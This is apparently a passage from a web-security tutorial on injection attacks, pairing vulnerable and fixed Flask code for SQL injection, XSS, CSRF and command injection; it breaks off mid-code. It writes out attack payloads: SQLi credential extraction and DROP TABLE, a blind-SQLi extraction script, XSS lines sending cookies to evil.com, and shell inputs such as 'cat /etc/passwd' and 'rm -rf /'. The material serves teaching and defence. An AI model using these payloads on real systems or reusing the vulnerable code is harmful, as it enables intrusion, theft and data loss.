# 08. Injection Attacks and Prevention

**Previous**: [07. OWASP Top 10 (2021)](07_OWASP_Top10.md) | **Next**: [09. Web Security Headers and CSP](./09_Web_Security_Headers.md)

---

Injection attacks remain among the most devastating vulnerabilities in web applications. They occur when untrusted data is sent to an interpreter as part of a command or query, causing unintended execution. While injection has dropped from #1 to #3 on the OWASP Top 10, it remains critically dangerous because a single injection vulnerability can lead to complete data breach or system compromise. This lesson provides an in-depth examination of SQL injection, Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), command injection, LDAP injection, and Server-Side Template Injection (SSTI), with vulnerable and secure code examples for each.

## Learning Objectives

- Understand the root cause of injection vulnerabilities (mixing code and data)
- Identify and exploit SQL injection variants (classic, blind, second-order)
- Recognize and prevent all three XSS types (reflected, stored, DOM-based)
- Implement CSRF protection with tokens and SameSite cookies
- Prevent command injection, LDAP injection, and template injection
- Apply defense-in-depth with parameterized queries, output encoding, and Content Security Policy
- Write secure code patterns in Python/Flask for each injection type

---

## 1. The Root Cause of Injection

```
┌─────────────────────────────────────────────────────────────────┐
│              Why Injection Happens                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  The fundamental problem:                                        │
│  CODE and DATA are mixed in the same channel                    │
│                                                                  │
│  Normal operation:                                               │
│  ┌──────────────────────────────────────────────┐               │
│  │  SELECT * FROM users WHERE name = 'Alice'    │               │
│  │  ──────────── CODE ───────────  ── DATA ──   │               │
│  └──────────────────────────────────────────────┘               │
│                                                                  │
│  Injection:                                                      │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  SELECT * FROM users WHERE name = '' OR '1'='1' --'      │   │
│  │  ──────────── CODE ───────────   ──INJECTED CODE──       │   │
│  └──────────────────────────────────────────────────────────┘   │
│                                                                  │
│  The interpreter cannot distinguish between:                     │
│  - The code the developer intended                              │
│  - The code the attacker injected                               │
│                                                                  │
│  Solution: NEVER mix code and data                              │
│  Use parameterized interfaces that keep them separate           │
│                                                                  │
│  ┌──────────────────────────────────────────────┐               │
│  │  Prepared Statement:                          │               │
│  │  Code:  SELECT * FROM users WHERE name = ?    │               │
│  │  Data:  ["' OR '1'='1' --"]                   │               │
│  │  Result: Treats ENTIRE input as a string      │               │
│  │  No injection possible!                       │               │
│  └──────────────────────────────────────────────┘               │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## 2. SQL Injection

### 2.1 Classic SQL Injection

Classic (or in-band) SQL injection is the most straightforward type, where the attacker receives the result of the injected query directly in the application's response.

```
┌─────────────────────────────────────────────────────────────────┐
│              Classic SQL Injection                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Login Form:                                                     │
│  ┌─────────────────────────────┐                                │
│  │ Username: admin' --         │                                │
│  │ Password: anything          │                                │
│  │ [Login]                     │                                │
│  └─────────────────────────────┘                                │
│                                                                  │
│  Intended Query:                                                 │
│  SELECT * FROM users                                             │
│  WHERE username = 'admin' AND password = 'hashed_pwd'           │
│                                                                  │
│  Injected Query:                                                 │
│  SELECT * FROM users                                             │
│  WHERE username = 'admin' --' AND password = 'anything'         │
│                      │        │                                  │
│                      │        └── Comment, ignores rest          │
│                      └── Always matches admin user               │
│                                                                  │
│  Result: Logged in as admin without knowing the password!        │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

```python
"""
sql_injection_examples.py - SQL injection vulnerable and fixed code
"""
import sqlite3
from flask import Flask, request, jsonify, g

app = Flask(__name__)

DATABASE = 'app.db'


def get_db():
    if 'db' not in g:
        g.db = sqlite3.connect(DATABASE)
        g.db.row_factory = sqlite3.Row
    return g.db


# ==============================================================
# VULNERABLE: String concatenation (Classic SQLi)
# ==============================================================

@app.route('/api/v1/login', methods=['POST'])
def login_vulnerable():
    """VULNERABLE: SQL Injection in login."""
    username = request.json.get('username')
    password = request.json.get('password')

    db = get_db()
    # NEVER DO THIS: String formatting with user input
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    user = db.execute(query).fetchone()

    if user:
        return jsonify({"status": "logged in", "user": user['username']})
    return jsonify({"error": "Invalid credentials"}), 401

# Attack payloads:
# username: admin' --           → Bypasses password check
# username: ' OR '1'='1         → Returns first user
# username: ' UNION SELECT 1,2,3,username,password FROM users --
#                                → Extracts all usernames and passwords


@app.route('/api/v1/search', methods=['GET'])
def search_vulnerable():
    """VULNERABLE: SQL Injection in search."""
    query = request.args.get('q', '')

    db = get_db()
    # NEVER DO THIS
    sql = f"SELECT * FROM products WHERE name LIKE '%{query}%'"
    results = db.execute(sql).fetchall()

    return jsonify([dict(r) for r in results])

# Attack payloads:
# q=' UNION SELECT 1,sql,3,4,5 FROM sqlite_master --
#   → Extracts database schema
# q=' UNION SELECT 1,username,3,password,5 FROM users --
#   → Extracts user credentials


# ==============================================================
# VULNERABLE: UNION-based extraction
# ==============================================================

@app.route('/api/v1/product/<int:product_id>')
def get_product_vulnerable(product_id):
    """VULNERABLE: Even with int type hint, other params may be injectable."""
    sort = request.args.get('sort', 'name')

    db = get_db()
    # sort parameter is not parameterized!
    sql = f"SELECT * FROM products WHERE id = ? ORDER BY {sort}"
    result = db.execute(sql, (product_id,)).fetchall()

    return jsonify([dict(r) for r in result])

# Attack:
# /api/v1/product/1?sort=name; DROP TABLE products --


# ==============================================================
# FIXED: Parameterized queries
# ==============================================================

@app.route('/api/v2/login', methods=['POST'])
def login_secure():
    """FIXED: Parameterized query prevents injection."""
    username = request.json.get('username', '')
    password = request.json.get('password', '')

    db = get_db()
    # Use parameter placeholders (?)
    user = db.execute(
        "SELECT * FROM users WHERE username = ? AND password_hash = ?",
        (username, hash_password(password))
    ).fetchone()

    if user:
        return jsonify({"status": "logged in", "user": user['username']})
    return jsonify({"error": "Invalid credentials"}), 401


@app.route('/api/v2/search', methods=['GET'])
def search_secure():
    """FIXED: Parameterized search query."""
    query = request.args.get('q', '')

    db = get_db()
    results = db.execute(
        "SELECT * FROM products WHERE name LIKE ?",
        (f"%{query}%",)  # Entire search term is a parameter
    ).fetchall()

    return jsonify([dict(r) for r in results])


@app.route('/api/v2/product/<int:product_id>')
def get_product_secure(product_id):
    """FIXED: Whitelist for ORDER BY column."""
    sort = request.args.get('sort', 'name')

    # Whitelist allowed sort columns
    ALLOWED_SORT_COLUMNS = {'name', 'price', 'created_at', 'rating'}
    if sort not in ALLOWED_SORT_COLUMNS:
        sort = 'name'  # Default to safe value

    db = get_db()
    # Column name can't be parameterized, so we use whitelist
    sql = f"SELECT * FROM products WHERE id = ? ORDER BY {sort}"
    result = db.execute(sql, (product_id,)).fetchall()

    return jsonify([dict(r) for r in result])
```

### 2.2 Blind SQL Injection

When the application does not display query results or error messages, attackers use blind techniques to extract data one bit at a time.

```
┌─────────────────────────────────────────────────────────────────┐
│              Blind SQL Injection Types                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Boolean-Based Blind:                                            │
│  The application shows different behavior for TRUE vs FALSE      │
│                                                                  │
│  /user?id=1 AND 1=1    → Normal page (TRUE)                    │
│  /user?id=1 AND 1=2    → Different page (FALSE)                │
│                                                                  │
│  Extract data character by character:                            │
│  /user?id=1 AND SUBSTRING(                                      │
│    (SELECT password FROM users WHERE username='admin'),          │
│    1, 1) = 'a'          → TRUE/FALSE for each character         │
│                                                                  │
│  Time-Based Blind:                                               │
│  The application response time reveals TRUE/FALSE                │
│                                                                  │
│  /user?id=1; IF(1=1, SLEEP(5), 0)  → 5 second delay (TRUE)    │
│  /user?id=1; IF(1=2, SLEEP(5), 0)  → Instant response (FALSE) │
│                                                                  │
│  Extract data:                                                   │
│  /user?id=1; IF(SUBSTRING(                                      │
│    (SELECT password FROM users LIMIT 1),                         │
│    1, 1) = 'a',                                                  │
│    SLEEP(5), 0)          → Delay if first char is 'a'           │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

```python
"""
blind_sqli_demo.py - Demonstrating how blind SQL injection works
FOR EDUCATIONAL PURPOSES ONLY
"""
import time
import requests
from string import ascii_lowercase, digits

# This simulates what an attacker's script looks like
# DO NOT use against systems you don't own

TARGET = "http://vulnerable-app.local/user"
CHARSET = ascii_lowercase + digits + "!@#$%"


def boolean_blind_extract(query_template: str, max_length: int = 32) -> str:
    """
    Extract data using boolean-based blind SQL injection.
    query_template should have {pos} and {char} placeholders.
    """
    result = ""

    for pos in range(1, max_length + 1):
        found = False
        for char in CHARSET:
            payload = query_template.format(pos=pos, char=char)
            response = requests.get(TARGET, params={"id": payload})

            if "Welcome" in response.text:  # TRUE condition
                result += char
                print(f"Position {pos}: '{char}' (extracted so far: '{result}')")
                found = True
                break

        if not found:
            break  # End of string

    return result


def time_blind_extract(query_template: str, max_length: int = 32) -> str:
    """
    Extract data using time-based blind SQL injection.
    """
    result = ""

    for pos in range(1, max_length + 1):
        found = False
        for char in CHARSET:
            payload = query_template.format(pos=pos, char=char)
            start = time.time()
            requests.get(TARGET, params={"id": payload})
            elapsed = time.time() - start

            if elapsed > 4:  # Delay detected = TRUE
                result += char
                print(f"Position {pos}: '{char}' (elapsed: {elapsed:.1f}s)")
                found = True
                break

        if not found:
            break

    return result


# Example: Extract admin password with boolean-based blind
# admin_password = boolean_blind_extract(
#     "1 AND SUBSTRING((SELECT password FROM users WHERE username='admin'),{pos},1)='{char}'"
# )
```

### 2.3 Second-Order SQL Injection

Second-order SQL injection occurs when user input is stored in the database and later used unsafely in a different query.

```
┌─────────────────────────────────────────────────────────────────┐
│              Second-Order SQL Injection                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Step 1: Attacker registers with malicious username              │
│  ┌─────────────────────────────────────┐                        │
│  │ Username: admin'--                  │                         │
│  │ Password: anything                  │                         │
│  │ [Register]                          │                         │
│  └─────────────────────────────────────┘                        │
│  → Username "admin'--" safely stored using parameterized query   │
│                                                                  │
│  Step 2: Attacker triggers "change password" flow               │
│  Server code retrieves username from database:                   │
│  username = get_current_user().username  → "admin'--"            │
│                                                                  │
│  Server uses it in another query (unsafely):                    │
│  UPDATE users SET password = 'new_hash'                         │
│    WHERE username = 'admin'--'                                   │
│                                                                  │
│  Result: Changed ADMIN's password, not their own!               │
│                                                                  │
│  The first query was safe. The second wasn't.                   │
│  Defense: Parameterize ALL queries, even those using             │
│  data retrieved from your own database.                          │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

```python
# VULNERABLE: Second-order SQL injection

@app.route('/api/change-password', methods=['POST'])
def change_password_vulnerable():
    user = get_current_user()  # Retrieved from DB
    new_password = request.json['new_password']
    new_hash = hash_password(new_password)

    db = get_db()
    # VULNERABLE: username from DB used without parameterization!
    db.execute(
        f"UPDATE users SET password_hash = '{new_hash}' "
        f"WHERE username = '{user.username}'"  # user.username = "admin'--"
    )
    db.commit()
    return jsonify({"status": "updated"})


# FIXED: Parameterize even when data comes from your own database

@app.route('/api/change-password', methods=['POST'])
def change_password_secure():
    user = get_current_user()
    new_password = request.json['new_password']
    new_hash = hash_password(new_password)

    db = get_db()
    db.execute(
        "UPDATE users SET password_hash = ? WHERE id = ?",
        (new_hash, user.id)  # Use user ID (integer), not username
    )
    db.commit()
    return jsonify({"status": "updated"})
```

### 2.4 SQLAlchemy ORM (Recommended Approach)

```python
"""
sqlalchemy_safe.py - Using SQLAlchemy ORM for automatic parameterization
"""
from flask import Flask, request, jsonify
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///app.db'
db = SQLAlchemy(app)


class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    email = db.Column(db.String(120), unique=True, nullable=False)
    password_hash = db.Column(db.String(256), nullable=False)


class Product(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(200), nullable=False)
    price = db.Column(db.Float, nullable=False)
    description = db.Column(db.Text)


# SAFE: ORM queries are automatically parameterized

@app.route('/api/login', methods=['POST'])
def login():
    username = request.json.get('username', '')
    password = request.json.get('password', '')

    # ORM handles parameterization
    user = User.query.filter_by(username=username).first()

    if user and verify_password(password, user.password_hash):
        return jsonify({"status": "logged in"})
    return jsonify({"error": "Invalid credentials"}), 401


@app.route('/api/search')
def search():
    query = request.args.get('q', '')

    # SAFE: SQLAlchemy parameterizes this
    products = Product.query.filter(
        Product.name.ilike(f'%{query}%')
    ).all()

    return jsonify([{
        "id": p.id,
        "name": p.name,
        "price": p.price
    } for p in products])


@app.route('/api/products')
def list_products():
    # SAFE: Whitelist + ORM for sorting
    sort_column = request.args.get('sort', 'name')
    sort_order = request.args.get('order', 'asc')

    ALLOWED_COLUMNS = {
        'name': Product.name,
        'price': Product.price,
    }

    column = ALLOWED_COLUMNS.get(sort_column, Product.name)
    if sort_order == 'desc':
        column = column.desc()

    products = Product.query.order_by(column).all()
    return jsonify([{"id": p.id, "name": p.name, "price": p.price}
                    for p in products])


# WARNING: Raw SQL in ORM can still be vulnerable!

# VULNERABLE: Raw SQL string formatting
# db.session.execute(f"SELECT * FROM users WHERE name = '{name}'")

# SAFE: Raw SQL with parameters
# db.session.execute(text("SELECT * FROM users WHERE name = :name"),
#                    {"name": name})
```

---

## 3. Cross-Site Scripting (XSS)

### 3.1 XSS Overview

XSS allows attackers to inject malicious scripts into web pages viewed by other users. The script executes in the victim's browser with the same permissions as the legitimate page.

```
┌─────────────────────────────────────────────────────────────────┐
│              Cross-Site Scripting (XSS) Types                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. Reflected XSS (Type 1)                                      │
│     Payload is in the request (URL, form data)                  │
│     Server includes it in the response without escaping         │
│     ┌──────┐    ┌──────┐    ┌──────┐                           │
│     │Victim│───▶│Server│───▶│Victim│                           │
│     │clicks│    │echoes│    │script│                            │
│     │link  │    │input │    │runs  │                            │
│     └──────┘    └──────┘    └──────┘                           │
│                                                                  │
│  2. Stored XSS (Type 2)                                         │
│     Payload is stored in the database (comment, profile, etc.)  │
│     Served to ALL users who view that page                      │
│     ┌────────┐    ┌──────┐    ┌──────┐    ┌──────┐            │
│     │Attacker│───▶│Server│    │Server│───▶│Victim│            │
│     │stores  │    │saves │    │serves│    │script│            │
│     │payload │    │to DB │    │from  │    │runs  │            │
│     └────────┘    └──────┘    │DB    │    └──────┘            │
│                               └──────┘                          │
│                                                                  │
│  3. DOM-Based XSS (Type 0)                                      │
│     Payload never reaches the server                            │
│     JavaScript on the page reads attacker input from URL/DOM    │
│     and inserts it unsafely                                     │
│     ┌──────┐                     ┌──────┐                      │
│     │Victim│────────────────────▶│Client│                      │
│     │clicks│  URL fragment (#)   │  JS  │                      │
│     │link  │  or DOM property    │ reads │                      │
│     └──────┘                     │ and   │                      │
│                                  │injects│                      │
│                                  └──────┘                      │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 3.2 Reflected XSS

```python
"""
xss_reflected.py - Reflected XSS vulnerability and fix
"""
from flask import Flask, request, render_template_string, Markup
import html

app = Flask(__name__)

# ==============================================================
# VULNERABLE: Reflected XSS
# ==============================================================

@app.route('/search-vulnerable')
def search_vulnerable():
    query = request.args.get('q', '')

    # VULNERABLE: User input directly in HTML without escaping
    return f"""
    <html>
    <body>
        <h1>Search Results</h1>
        <p>You searched for: {query}</p>
        <p>No results found.</p>
    </body>
    </html>
    """

# Attack URL:
# /search-vulnerable?q=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
# When victim clicks this link, their cookies are sent to attacker


# ==============================================================
# FIXED: Output encoding / escaping
# ==============================================================

@app.route('/search-secure')
def search_secure():
    query = request.args.get('q', '')

    # Method 1: Manual HTML escaping
    safe_query = html.escape(query)

    return f"""
    <html>
    <body>
        <h1>Search Results</h1>
        <p>You searched for: {safe_query}</p>
        <p>No results found.</p>
    </body>
    </html>
    """

# Input:  <script>alert('XSS')</script>
# Output: &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
# Renders as text, not as executable script


# Method 2: Use Jinja2 templates (auto-escaping enabled by default)
@app.route('/search-template')
def search_template():
    query = request.args.get('q', '')

    # Jinja2 auto-escapes {{ query }} by default
    return render_template_string("""
    <html>
    <body>
        <h1>Search Results</h1>
        <p>You searched for: {{ query }}</p>
        <p>No results found.</p>
    </body>
    </html>
    """, query=query)


# WARNING: Jinja2's |safe filter and Markup() disable auto-escaping!
# NEVER use these with user input:
# {{ user_input|safe }}         ← DANGEROUS
# Markup(user_input)            ← DANGEROUS
```

### 3.3 Stored XSS

```python
"""
xss_stored.py - Stored XSS vulnerability and fix
"""
from flask import Flask, request, jsonify, render_template_string
import html
import bleach

app = Flask(__name__)

comments_db = []  # Simulated database


# ==============================================================
# VULNERABLE: Stored XSS via comments
# ==============================================================

@app.route('/api/comments', methods=['POST'])
def add_comment_vulnerable():
    """Store comment without sanitization."""
    comment = {
        'author': request.json['author'],
        'text': request.json['text'],  # Stored as-is!
    }
    comments_db.append(comment)
    return jsonify({"status": "added"})


@app.route('/comments-vulnerable')
def show_comments_vulnerable():
    """Render comments without escaping."""
    html_parts = ['<html><body><h1>Comments</h1>']
    for c in comments_db:
        # VULNERABLE: Direct insertion of stored data
        html_parts.append(f'<div><b>{c["author"]}</b>: {c["text"]}</div>')
    html_parts.append('</body></html>')
    return '\n'.join(html_parts)

# Attack: POST {"author": "hacker", "text": "<script>new Image().src='https://evil.com/steal?c='+document.cookie</script>"}
# Every user who views comments page has their cookies stolen


# ==============================================================
# FIXED: Sanitize on output (and optionally on input)
# ==============================================================

@app.route('/api/comments-secure', methods=['POST'])
def add_comment_secure():
    """Store comment with input validation."""
    author = request.json.get('author', '').strip()
    text = request.json.get('text', '').strip()

    # Input validation
    if not author or not text:
        return jsonify({"error": "Author and text required"}), 400

    if len(author) > 100 or len(text) > 5000:
        return jsonify({"error": "Input too long"}), 400

    # Option A: Strip all HTML (for plain text comments)
    comment = {
        'author': html.escape(author),
        'text': html.escape(text),
    }

    # Option B: Allow limited HTML (for rich text comments)
    # Uses bleach to whitelist specific tags
    comment_rich = {
        'author': bleach.clean(author, tags=[], strip=True),
        'text': bleach.clean(
            text,
            tags=['b', 'i', 'em', 'strong', 'a', 'code', 'pre', 'p', 'br'],
            attributes={'a': ['href', 'title']},
            protocols=['http', 'https'],  # No javascript: URLs!
            strip=True
        ),
    }

    comments_db.append(comment)
    return jsonify({"status": "added"})


@app.route('/comments-secure')
def show_comments_secure():
    """Render comments with Jinja2 auto-escaping."""
    return render_template_string("""
    <html>
    <body>
        <h1>Comments</h1>
        {% for c in comments %}
        <div>
            <b>{{ c.author }}</b>: {{ c.text }}
        </div>
        {% endfor %}
    </body>
    </html>
    """, comments=comments_db)
```

### 3.4 DOM-Based XSS

```html
<!-- dom_xss_vulnerable.html -->
<!-- VULNERABLE: DOM-based XSS -->
<!DOCTYPE html>
<html>
<body>
    <h1>Welcome</h1>
    <div id="greeting"></div>

    <script>
    // VULNERABLE: Reads from URL fragment and inserts into DOM unsafely
    var name = decodeURIComponent(window.location.hash.substring(1));
    document.getElementById('greeting').innerHTML = 'Hello, ' + name;
    // innerHTML interprets HTML, so script tags will execute
    </script>
</body>
</html>

<!--
Attack URL: page.html#<img src=x onerror=alert(document.cookie)>
The payload never reaches the server (fragment is client-side only)
-->
```

```html
<!-- dom_xss_fixed.html -->
<!-- FIXED: Safe DOM manipulation -->
<!DOCTYPE html>
<html>
<body>
    <h1>Welcome</h1>
    <div id="greeting"></div>

    <script>
    // FIXED: Use textContent instead of innerHTML
    var name = decodeURIComponent(window.location.hash.substring(1));

    // Method 1: textContent (sets plain text, no HTML parsing)
    document.getElementById('greeting').textContent = 'Hello, ' + name;

    // Method 2: Create text node
    // var textNode = document.createTextNode('Hello, ' + name);
    // document.getElementById('greeting').appendChild(textNode);

    // Method 3: Use a sanitization library (DOMPurify)
    // import DOMPurify from 'dompurify';
    // document.getElementById('greeting').innerHTML =
    //     DOMPurify.sanitize('Hello, ' + name);
    </script>
</body>
</html>
```

### 3.5 XSS Context-Specific Encoding

Different HTML contexts require different encoding strategies:

```
┌─────────────────────────────────────────────────────────────────┐
│              XSS Encoding by Context                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Context              Encoding Required        Example           │
│  ─────────            ─────────────────        ─────────         │
│                                                                  │
│  HTML body            HTML entity encoding                       │
│  <p>USER_INPUT</p>    &lt; &gt; &amp; &quot;                    │
│                                                                  │
│  HTML attribute       HTML attribute encoding + quote            │
│  <div title="INPUT">  Use quotes, encode " & < >               │
│                                                                  │
│  JavaScript string    JavaScript encoding                       │
│  var x = 'INPUT';     \xHH or \uHHHH encoding                  │
│                                                                  │
│  URL parameter        URL/percent encoding                       │
│  href="?q=INPUT"      %XX encoding                              │
│                                                                  │
│  CSS value            CSS encoding                               │
│  style="color:INPUT"  \HH encoding (avoid if possible)          │
│                                                                  │
│  IMPORTANT: Use the encoding for the SPECIFIC context            │
│  HTML encoding in a JavaScript string context is NOT sufficient! │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

```python
"""
xss_encoding.py - Context-specific XSS encoding
"""
import html
import json
import urllib.parse
from markupsafe import Markup, escape


def encode_for_html(value: str) -> str:
    """Encode for HTML body context."""
    return html.escape(value)
    # < → &lt;  > → &gt;  & → &amp;  " → &quot;  ' → &#x27;


def encode_for_html_attribute(value: str) -> str:
    """Encode for HTML attribute context."""
    return html.escape(value, quote=True)


def encode_for_javascript(value: str) -> str:
    """Encode for JavaScript string context."""
    # json.dumps adds quotes and escapes special chars
    return json.dumps(value)
    # This handles: \n, \r, \t, \", \\, unicode chars


def encode_for_url(value: str) -> str:
    """Encode for URL parameter context."""
    return urllib.parse.quote(value, safe='')


# Usage in Flask/Jinja2 template:
"""
<!-- HTML context (Jinja2 auto-escapes) -->
<p>{{ user_input }}</p>

<!-- HTML attribute (Jinja2 auto-escapes) -->
<div title="{{ user_input }}">

<!-- JavaScript context (use tojson filter) -->
<script>
var data = {{ user_input|tojson }};
</script>

<!-- URL context -->
<a href="/search?q={{ user_input|urlencode }}">Search</a>

<!-- DANGEROUS: Never put user input directly in these contexts -->
<!-- <script>{{ user_input }}</script>            NEVER -->
<!-- <div onmouseover="{{ user_input }}">         NEVER -->
<!-- <style>{{ user_input }}</style>               NEVER -->
"""
```

---

## 4. Cross-Site Request Forgery (CSRF)

### 4.1 How CSRF Works

CSRF tricks a logged-in user's browser into sending a forged request to a vulnerable application, using the user's existing session cookie.

```
┌─────────────────────────────────────────────────────────────────┐
│              Cross-Site Request Forgery (CSRF)                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. User logs into bank.com (session cookie set)                │
│                                                                  │
│  2. User visits evil.com (in another tab)                       │
│                                                                  │
│  3. evil.com contains:                                           │
│     <form action="https://bank.com/transfer" method="POST">    │
│       <input type="hidden" name="to" value="attacker">         │
│       <input type="hidden" name="amount" value="10000">        │
│     </form>                                                      │
│     <script>document.forms[0].submit()</script>                 │
│                                                                  │
│  4. Browser sends the form POST to bank.com                     │
│     WITH the user's session cookie (automatic)                  │
│                                                                  │
│  5. bank.com receives a valid, authenticated request            │
│     and transfers $10,000 to the attacker                       │
│                                                                  │
│  ┌──────┐    ┌──────────┐    ┌──────────┐                      │
│  │Victim│───▶│ evil.com │───▶│ bank.com │                      │
│  │      │    │ (hidden  │    │ (trusts  │                      │
│  │      │    │  form)   │    │  cookie) │                      │
│  └──────┘    └──────────┘    └──────────┘                      │
│                                                                  │
│  Why it works:                                                   │
│  - Browsers automatically send cookies with every request       │
│  - The server can't distinguish user-initiated vs forged        │
│    requests (both have valid cookies)                            │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 4.2 CSRF Prevention

```python
"""
csrf_prevention.py - CSRF protection implementation
"""
import secrets
import hmac
import hashlib
from flask import Flask, request, session, jsonify, render_template_string, abort
from functools import wraps

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)


# ==============================================================
# Method 1: Synchronizer Token Pattern
# ==============================================================

def generate_csrf_token() -> str:
    """Generate a CSRF token and store in session."""
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_hex(32)
    return session['csrf_token']


# Make csrf_token available in all templates
app.jinja_env.globals['csrf_token'] = generate_csrf_token


def csrf_protect(f):
    """Decorator to enforce CSRF token validation."""
    @wraps(f)
    def decorated(*args, **kwargs):
        if request.method in ('POST', 'PUT', 'DELETE', 'PATCH'):
            # Check token in form data or header
            token = (
                request.form.get('csrf_token') or
                request.headers.get('X-CSRF-Token')
            )
            expected = session.get('csrf_token')

            if not token or not expected:
                abort(403, description="CSRF token missing")

            # Constant-time comparison to prevent timing attacks
            if not hmac.compare_digest(token, expected):
                abort(403, description="CSRF token invalid")

        return f(*args, **kwargs)
    return decorated


# Usage in templates:
TRANSFER_FORM = """
<html>
<body>
    <h1>Transfer Money</h1>
    <form method="POST" action="/transfer">
        <!-- CSRF token as hidden field -->
        <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
        <label>To: <input type="text" name="to"></label>
        <label>Amount: <input type="number" name="amount"></label>
        <button type="submit">Transfer</button>
    </form>
</body>
</html>
"""

@app.route('/transfer', methods=['GET', 'POST'])
@csrf_protect
def transfer():
    if request.method == 'GET':
        return render_template_string(TRANSFER_FORM)

    # POST - CSRF token has been validated by decorator
    to = request.form.get('to')
    amount = request.form.get('amount')
    # Process transfer...
    return jsonify({"status": "transferred"})


# For AJAX requests, include the token in a header:
AJAX_EXAMPLE = """
<script>
// Get token from meta tag or cookie
var csrfToken = document.querySelector('meta[name="csrf-token"]').content;

fetch('/api/transfer', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken  // Send token in header
    },
    body: JSON.stringify({to: 'bob', amount: 100})
});
</script>
"""


# ==============================================================
# Method 2: SameSite Cookie (Defense-in-depth)
# ==============================================================

app.config.update(
    SESSION_COOKIE_SAMESITE='Lax',   # Don't send cookie on cross-site POST
    SESSION_COOKIE_SECURE=True,       # HTTPS only
    SESSION_COOKIE_HTTPONLY=True,      # No JavaScript access
)

# SameSite values:
# 'Strict' - Cookie never sent on cross-site requests
#            (breaks "login with Google" type flows)
# 'Lax'    - Cookie sent on top-level GET navigations, but NOT on
#            cross-site POST/PUT/DELETE (recommended default)
# 'None'   - Cookie always sent (requires Secure flag)
#            (needed for cross-site authenticated requests)


# ==============================================================
# Method 3: Double Submit Cookie
# ==============================================================

@app.route('/api/transfer', methods=['POST'])
def api_transfer():
    """
    Double Submit Cookie pattern:
    1. Server sets a random value in a cookie
    2. Client must send the same value in a header
    3. Attacker can't read the cookie value (same-origin policy)
    """
    cookie_token = request.cookies.get('csrf_token')
    header_token = request.headers.get('X-CSRF-Token')

    if not cookie_token or not header_token:
        return jsonify({"error": "CSRF token missing"}), 403

    if not hmac.compare_digest(cookie_token, header_token):
        return jsonify({"error": "CSRF token mismatch"}), 403

    # Process the request...
    return jsonify({"status": "success"})
```

### 4.3 CSRF Prevention Summary

| Method | How It Works | Pros | Cons |
|--------|-------------|------|------|
| Synchronizer Token | Random token in session + form | Strong, widely supported | Requires server-side session |
| SameSite Cookie | Browser blocks cross-site cookies | Simple, no code changes | Old browser support, only defense-in-depth |
| Double Submit Cookie | Token in cookie + header must match | Stateless | Vulnerable if subdomain is compromised |
| Custom Header | Custom header required (e.g., X-Requested-With) | Simple for AJAX | Only works for AJAX requests |
| Origin/Referer Check | Verify request origin matches expected | Defense-in-depth | Can be stripped by proxies |

---

## 5. Command Injection

### 5.1 How Command Injection Works

Command injection occurs when an application passes user input to a system shell command. The attacker can append additional commands using shell metacharacters.

```
┌─────────────────────────────────────────────────────────────────┐
│              Command Injection                                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Application intends:                                            │
│  ping -c 4 google.com                                            │
│                                                                  │
│  Attacker provides:                                              │
│  google.com; cat /etc/passwd                                     │
│                                                                  │
│  Executed command:                                               │
│  ping -c 4 google.com; cat /etc/passwd                          │
│  ─────────────────────  ─────────────────                       │
│  intended command        injected command                        │
│                                                                  │
│  Shell Metacharacters:                                           │
│  ;    → Command separator (run both commands)                   │
│  &&   → Run second command if first succeeds                    │
│  ||   → Run second command if first fails                       │
│  |    → Pipe output to next command                             │
│  `cmd`→ Command substitution (backticks)                        │
│  $(cmd) → Command substitution                                  │
│  > file → Redirect output to file                               │
│  < file → Read input from file                                  │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 5.2 Vulnerable and Fixed Code

```python
"""
command_injection.py - Command injection vulnerability and prevention
"""
import os
import subprocess
import shlex
import re
from flask import Flask, request, jsonify

app = Flask(__name__)


# ==============================================================
# VULNERABLE: os.system with user input
# ==============================================================

@app.route('/api/ping-vulnerable', methods=['POST'])
def ping_vulnerable():
    """VULNERABLE: Command injection via os.system."""
    host = request.json['host']

    # NEVER DO THIS
    result = os.popen(f"ping -c 4 {host}").read()
    return jsonify({"output": result})

# Attack: {"host": "google.com; cat /etc/passwd"}
# Attack: {"host": "google.com; rm -rf /"}
# Attack: {"host": "$(whoami)"}


@app.route('/api/lookup-vulnerable', methods=['POST'])
def lookup_vulnerable():
    """VULNERABLE: Command injection via subprocess with shell=True."""
    domain = request.json['domain']

    # shell=True makes this vulnerable!
    result = subprocess.run(
        f"nslookup {domain}",
        shell=True,  # DANGEROUS: enables shell metacharacter processing
        capture_output=True,
        text=True
    )
    return jsonify({"output": result.stdout})


# ==============================================================
# FIXED: Multiple defense layers
# ==============================================================

@app.route('/api/ping-secure', methods=['POST'])
def ping_secure():
    """FIXED: Safe command execution."""
    host = request.json.get('host', '')

    # Defense 1: Input validation (whitelist)
    if not re.match(r'^[a-zA-Z0-9.\-]+$', host):
        return jsonify({"error": "Invalid hostname"}), 400

    # Defense 2: Length limit
    if len(host) > 253:  # Max DNS name length
